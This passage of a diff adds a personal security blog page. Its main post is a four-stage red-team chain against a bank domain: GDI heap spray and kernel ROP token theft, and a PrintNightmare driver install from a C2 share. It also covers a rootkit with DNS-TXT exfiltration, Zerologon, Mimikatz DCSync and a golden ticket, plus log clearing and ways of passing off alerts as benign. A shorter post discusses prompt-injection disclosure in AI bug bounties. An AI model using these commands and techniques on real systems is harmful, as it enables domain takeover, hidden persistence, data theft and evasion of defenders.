+asm.GetType("Agent.Entry").GetMethod("Run").Invoke(null, null);</code></pre>
+
+                                <h5>4. WinDbg snippet</h5>
+                                <pre><code>0: kd&gt; lm m mshtml
+00007ffd`3b6d0000 00007ffd`3b865000   mshtml
+0: kd&gt; uf mshtml!CMarkup::Load+0x2A
+mshtml!CMarkup::Load+0x28: mov     rcx,[rsp+28h]
+mshtml!CMarkup::Load+0x2F: call    qword ptr [rcx+40h]  ; ActiveX bug</code></pre>
+
+                                <h5>5. Logs and artifacts</h5>
+                                <ul>
+                                    <li>Sysmon 3: Image: regsvr32.exe, CommandLine: scrobj.dll blamed on an admin script</li>
+                                    <li>Splunk: single EventID 3 with an HTTPS GET to c2.bank.local</li>
+                                </ul>
+
+                                <h4>Stage 2: LPE via Win32k (CVE-2018-8453)</h4>
+                                <p><strong>Goal:</strong> in the WINWORD.EXE process obtain SYSTEM privileges without crashing</p>
+
+                                <h5>1. GDI-heap spray</h5>
+                                <p>Inside the agent I dynamically compile and run this C++ code:</p>
+                                <pre><code>std::vector&lt;HBITMAP&gt; v;
+for(int i=0;i&lt;60000;i++){
+  v.push_back(CreateBitmap(0x100,0x100,1,24,nullptr));
+}
+Sleep(INFINITE);</code></pre>
+                                <p>This fills the kernel heap with BITMAP objects</p>
+
+                                <h5>2. In-memory gadget discovery</h5>
+                                <p>In C# via PInvoke:</p>
+                                <pre><code>var drivers = EnumDeviceDrivers();
+var win32k = drivers.First(d =&gt; Path.GetFileName(d).Equals("win32k.sys",...));
+byte[] mem = ReadRemoteMemory(win32k.BaseAddress, win32k.Size);
+var gadgets = ScanForPatterns(mem, new[]{
+  new Pattern("pop rcx; ret"), 
+  new Pattern("pop rdx; ret"),
+  new Pattern("mov [rcx+0x358], rdx; ret"),
+  new Pattern("mov rax,[gs:0x188]…")
+});</code></pre>
+
+                                <h5>3. Offset determination</h5>
+                                <pre><code>0: kd&gt; dt nt!_EPROCESS Token
+   +0x358 Token : _EX_FAST_REF
+0: kd&gt; dt nt!_KPCR
+   +0x188 CurrentThread</code></pre>
+
+                                <h5>4. Constructing the ROP chain and triggering</h5>
+                                <pre><code>ulong selfEP   = ReadGS(0x188) + 0x70;
+ulong sysEP    = GetEPROCESSByPID(4);
+ulong sysToken = ReadPtr(sysEP + 0x358);
+
+List&lt;ulong&gt; rop = new List&lt;ulong&gt;{
+  gadgets["pop_rcx"], selfEP,
+  gadgets["pop_rdx"], sysToken,
+  gadgets["mov_rcx_rdx"], 
+  gadgets["jmp_rax"]
+};
+TriggerIoctl(rop.ToArray());</code></pre>
+
+                                <h5>5. Logs and artifacts</h5>
+                                <ul>
+                                    <li>Sysmon 10/11: hundreds of NtGdiCreateBitmap calls.</li>
+                                    <li>SentinelOne: alert "kernel memory write" but no block.</li>
+                                </ul>
+
+                                <h4>Stage 3: Persistence via PrintNightmare (CVE-2021-34527)</h4>
+                                <p><strong>Goal:</strong> leave a ring0 driver for survivability after reboot</p>
+
+                                <h5>1. SMB Responder</h5>
+                                <p>Upload driver.inf and payload.sys to <code>\\c2.bank.local\share</code></p>
+
+                                <h5>2. Installing as SYSTEM</h5>
+                                <p>Under SYSTEM:</p>
+                                <pre><code>rundll32.exe printui.dll,PrintUIEntry /ia /m "MyDriver" /f "\\c2.bank.local\share\driver.inf" /h "x64"</code></pre>
+
+                                <h5>3. Rootkit tricks</h5>
+                                <p>In DriverEntry:</p>
+                                <ul>
+                                    <li><strong>PE obfuscation:</strong> MmGetSystemRoutineAddress("RtlZeroMemory") → zero out the first 0x100 bytes of the PE header in memory</li>
+                                    <li><strong>DNS channel:</strong> in IRP_MJ_DEVICE_CONTROL, use DnsQueryEx to send AES-CBC encrypted data in TXT records to msupdate.bank.local</li>
+                                </ul>
+
+                                <h5>4. Partial cleanup</h5>
+                                <pre><code>wevtutil epl System C:\Temp\system.bak.evtx
+wevtutil cl System
+Remove-PrinterDriver -Name "MyDriver"
+Remove-Item "C:\Windows\System32\spool\drivers\x64\3\payload.sys" -Force</code></pre>
+
+                                <h5>5. Logs and artifacts</h5>
+                                <ul>
+                                    <li>EventID 7045: "Service MyDriver installed" disguised as a printer driver update</li>
+                                    <li>DnsQuery: Splunk records the TXT queries, marked benign msupdate</li>
+                                </ul>
+
+                                <h4>Stage 4: Zerologon + DCSync (CVE-2020-1472)</h4>
+                                <p><strong>Goal:</strong> obtain Domain Admin via DC password reset and DCSync</p>
+
+                                <h5>1. Zerologon</h5>
+                                <pre><code>python3 zeroLogon.py bank.local/ "" -dc-ip 10.0.40.5</code></pre>
+                                <p>DC machine account password reset</p>
+
+                                <h5>2. DCSync via Mimikatz</h5>
+                                <pre><code>Import-Module .\Invoke-Mimikatz.ps1
+$sec = Invoke-Mimikatz -Command '"lsadump::dcsync /domain:bank.local /user:krbtgt"'</code></pre>
+
+                                <h5>3. Golden Ticket</h5>
+                                <pre><code>New-GoldenTicket -Domain bank.local -User krbtgt -NTLM $sec.krbtgt |
+  Invoke-KerberosInjection
+Enter-PSSession -ComputerName dc1.bank.local -Credential bank.local\Administrator</code></pre>
+
+                                <h5>4. Logs and artifacts</h5>
+                                <ul>
+                                    <li>EventID 4769: TGS-request for krbtgt — blamed on key rotation.</li>
+                                    <li>Sysmon 3: WinRM requests from VLAN Users — explained as RMM startup</li>
+                                </ul>
+
+                                <h4>Results and Metrics</h4>
+                                <table style="width: 100%; border-collapse: collapse; margin: 1rem 0;">
+                                    <thead>
+                                        <tr style="border-bottom: 1px solid rgba(0, 255, 65, 0.3);">
+                                            <th style="padding: 0.75rem; text-align: left; color: var(--primary);">Stage</th>
+                                            <th style="padding: 0.75rem; text-align: left; color: var(--primary);">Time</th>
+                                            <th style="padding: 0.75rem; text-align: left; color: var(--primary);">Logs/EDR</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr style="border-bottom: 1px solid rgba(0, 255, 65, 0.1);">
+                                            <td style="padding: 0.75rem;">RCE (40444)</td>
+                                            <td style="padding: 0.75rem;">~12 s</td>
+                                            <td style="padding: 0.75rem;">HTTPS-GET, regsvr32 in Sysmon</td>
+                                        </tr>
+                                        <tr style="border-bottom: 1px solid rgba(0, 255, 65, 0.1);">
+                                            <td style="padding: 0.75rem;">LPE (8453)</td>
+                                            <td style="padding: 0.75rem;">~20 s</td>
+                                            <td style="padding: 0.75rem;">GDI-spray EventID 10/11</td>
+                                        </tr>
+                                        <tr style="border-bottom: 1px solid rgba(0, 255, 65, 0.1);">
+                                            <td style="padding: 0.75rem;">Persistence (34527)</td>
+                                            <td style="padding: 0.75rem;">~30 s</td>
+                                            <td style="padding: 0.75rem;">PrintService 7045 + DNS-TXT in Splunk</td>
+                                        </tr>
+                                        <tr style="border-bottom: 1px solid rgba(0, 255, 65, 0.1);">
+                                            <td style="padding: 0.75rem;">Zerologon + DCSync (1472)</td>
+                                            <td style="padding: 0.75rem;">~10 s</td>
+                                            <td style="padding: 0.75rem;">TGS-request 4769, WinRM session</td>
+                                        </tr>
+                                        <tr>
+                                            <td style="padding: 0.75rem; font-weight: 600; color: var(--primary);">Total</td>
+                                            <td style="padding: 0.75rem; font-weight: 600; color: var(--primary);">~75 s</td>
+                                            <td style="padding: 0.75rem; font-weight: 600; color: var(--primary);">Zero critical alerts</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+
+                                <h4>Conclusion</h4>
+                                <p>Each of the four stages is based on publicly documented CVEs. Tricks like dynamic ROP scanning, in-memory obfuscation, and log masking turn a red-team operation into something nearly invisible.</p>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <article class="post-card expandable-post" data-index="2">
+                    <div class="post-border-hover"></div>
+                    <div class="post-corner top-left"></div>
+                    <div class="post-corner top-right"></div>
+                    <div class="post-content">
+                        <div class="post-header">
+                            <div class="post-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <h3 class="post-title">Companies are neglecting AI security, my write-up from bugcrowd</h3>
+                        </div>
+                        <p class="post-description">An analysis of common AI security vulnerabilities found in bug bounty programs, highlighting how organizations are failing to properly secure their machine learning implementations.</p>
+                        <div class="post-status">
+                            <span class="status-dot"></span>
+                            <span class="status-text">ACTIVE</span>
+                        </div>
+                        <div class="post-full-content" style="display: none;">
+                            <div class="article-content">
+                                <p>AI security has a blind spot. I recently disclosed a prompt-injection flaw in a major design platform that let me pull the assistant's content-safety architecture, filtering logic and moderation workflow. The report came back "out of scope."</p>
+
+                                <p><strong>Why this matters:</strong> once the playbook is public, targeted attacks get easier. Other programs OpenAI and Hugging Face among them classify the same issue as medium-severity and pay for it. If researchers stop reporting AI flaws, everyone loses.</p>
+
+                                <p>Bug-bounty briefs need to drop the blanket "prompt leaks are out of scope," update their taxonomies for real AI risks and accept that a prompt leak is a system leak.</p>
+
+                                <p>I'm still open to a technical conversation with the company involved. Let's raise the bar for AI security.</p>
+
+                                <div class="article-images">
+                                    <img src="1748613532157.jpg" alt="AI Security Analysis" class="article-image">
+                                    <img src="1748613532217.jpg" alt="Prompt Injection Details" class="article-image">
+                                    <img src="1748613532243.jpg" alt="Bug Bounty Report" class="article-image">
+                                </div>
+
+                                <div class="article-tags">
+                                    <span class="tag">#AISecurity</span>
+                                    <span class="tag">#PromptInjection</span>
+                                    <span class="tag">#BugBounty</span>
+                                    <span class="tag">#ResponsibleDisclosure</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+            </div>
+
+            <div class="pagination">
+                <button class="pagination-btn ghost" id="prevBtn">
+                    <i class="fas fa-chevron-left"></i>
+                </button>
+                <button class="pagination-btn active">1</button>
+                <button class="pagination-btn ghost">2</button>
+                <button class="pagination-btn ghost" id="nextBtn">
+                    <i class="fas fa-chevron-right"></i>
+                </button>
+            </div>
+        </main>
+    </div>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <p class="footer-text">© 2025 Omar Alikhanov | Ethical Hacker</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Post View Modal -->
+    <div class="post-view-modal" id="postViewModal">
+        <div class="post-view-container">
+            <button class="post-view-close" id="postViewClose">
+                <i class="fas fa-times"></i>
+            </button>
+            <div class="post-view-content" id="postViewContent">
+                <!-- Content will be inserted here -->
+            </div>
+        </div>
+    </div>
+
     <script src="script.js"></script>
 </body>
 </html>
-
